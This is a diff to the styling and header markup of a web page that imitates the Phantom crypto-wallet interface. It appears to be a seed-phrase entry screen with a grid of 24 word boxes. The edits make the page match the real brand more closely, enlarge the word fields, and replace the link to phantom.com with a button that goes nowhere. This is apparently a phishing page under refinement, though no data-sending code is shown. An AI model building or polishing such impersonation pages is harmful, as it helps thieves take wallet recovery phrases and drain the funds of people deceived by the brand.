@@ -13,7 +13,7 @@
         }
 
         body {
-            background-color: #f3eef9; /* Really light purple page background */
+            background-color: #d8d6eb; /* Darker, accurate Phantom purple background */
             color: #fff;
             height: 100vh;
             display: flex;
@@ -31,24 +31,28 @@
             width: 100%;
         }
 
-        .logo-container {
+        /* Top Left Phantom Ghost Icon */
+        .ghost-close {
             display: flex;
             align-items: center;
+            justify-content: center;
+            background: transparent;
+            border: none;
             cursor: pointer;
             width: 32px;
             height: 32px;
         }
 
-        .logo-container svg {
-            width: 32px;
-            height: 32px;
+        .ghost-close svg {
+            width: 28px;
+            height: 28px;
             fill: #000;
         }
 
         .help-link {
             color: #000;
             background: transparent;
-            border: 1px solid #d1d1e0;
+            border: 1px solid #bcbbd3;
             text-decoration: none;
             font-size: 13px;
             font-weight: 400;
@@ -73,10 +77,10 @@
 
         .modal {
             background-color: #0c0c0e;
-            width: 480px;
-            border-radius: 20px;
-            padding: 28px 24px 24px 24px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            width: 520px; /* Made wider and larger to accommodate bigger vertical boxes */
+            border-radius: 22px;
+            padding: 32px 28px 28px 28px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -86,13 +90,13 @@
         /* Pagination Dots */
         .dots {
             display: flex;
-            gap: 5px;
-            margin-bottom: 12px;
+            gap: 6px;
+            margin-bottom: 14px;
         }
 
         .dot {
-            width: 5px;
-            height: 5px;
+            width: 6px;
+            height: 6px;
             background-color: #3f3f46;
             border-radius: 50%;
         }
@@ -103,17 +107,17 @@
 
         /* Modal Titles */
         .modal-title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 600;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
             color: #fff;
             text-align: center;
         }
 
         .modal-subtitle {
-            font-size: 12px;
+            font-size: 13px;
             color: #8c8c9e;
-            margin-bottom: 14px;
+            margin-bottom: 18px;
             text-align: center;
             line-height: 1.4;
         }
@@ -129,8 +133,8 @@
         }
 
         .spinner {
-            width: 36px;
-            height: 36px;
+            width: 40px;
+            height: 40px;
             border: 3px solid #27272a;
             border-top: 3px solid #a855f7;
             border-radius: 50%;
@@ -147,22 +151,22 @@
             display: none !important;
         }
 
-        /* Expanded Inputs Container (No Scroll, Fits All 24 Inputs) */
+        /* Inputs Container Layout (Bigger, Taller Vertical Rectangular Boxes) */
         .inputs-container {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 6px;
+            gap: 10px;
             width: 100%;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
         }
 
         .input-group {
             position: relative;
             background-color: #141417;
             border: 1px solid #232329;
-            border-radius: 8px;
-            padding: 5px 8px;
-            height: 38px;
+            border-radius: 10px;
+            padding: 8px 12px;
+            height: 52px; /* Taller vertical boxes */
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -175,28 +179,28 @@
         }
 
         .input-group label {
-            font-size: 10px;
+            font-size: 11px; /* Bigger number text */
             color: #71717a;
             line-height: 1;
-            margin-bottom: 2px;
+            margin-bottom: 4px;
         }
 
         .input-group input {
             background: transparent;
             border: none;
             color: #fff;
-            font-size: 12px;
+            font-size: 14px; /* Bigger word text inside box */
             outline: none;
             width: 100%;
-            line-height: 1.2;
+            line-height: 1.3;
         }
 
         /* Error Label Text */
         .error-message {
             color: #ef4444;
-            font-size: 11px;
+            font-size: 12px;
             width: 100%;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             display: none;
             text-align: center;
         }
@@ -206,9 +210,9 @@
             color: #8c8c9e;
             background: none;
             border: none;
-            font-size: 12px;
+            font-size: 13px;
             cursor: pointer;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
             font-weight: 500;
             transition: color 0.25s ease;
         }
@@ -223,9 +227,9 @@
             background-color: #fff;
             color: #000;
             border: none;
-            border-radius: 10px;
-            padding: 12px;
-            font-size: 13px;
+            border-radius: 12px;
+            padding: 14px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
             transition: opacity 0.2s;
@@ -240,9 +244,10 @@
 
     <!-- Header -->
     <header>
-        <a href="https://phantom.com" target="_blank" class="logo-container" title="Phantom">
+        <!-- Phantom Ghost Icon replacing the X button -->
+        <button class="ghost-close" title="Phantom">
             <svg viewBox="0 0 24 24"><path d="M12.01 0C5.38 0 0 5.38 0 12c0 6.63 5.38 12 12.01 12 6.62 0 11.99-5.37 11.99-12 0-6.62-5.37-12-11.99-12zm4.18 16.32c-.31.31-.81.31-1.12 0l-3.06-3.06-3.06 3.06c-.31.31-.81.31-1.12 0-.31-.31-.31-.81 0-1.12l3.06-3.06-3.06-3.06c-.31-.31-.31-.81 0-1.12.31-.31.81-.31 1.12 0l3.06 3.06 3.06-3.06c.31-.31.81-.31 1.12 0 .31.31.31.81 0 1.12l-3.06 3.06 3.06 3.06c.31.31.31.81 0 1.12z"/></svg>
-        </a>
+        </button>
         <a href="https://phantom.com/help" target="_blank" class="help-link">
             <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
             Help
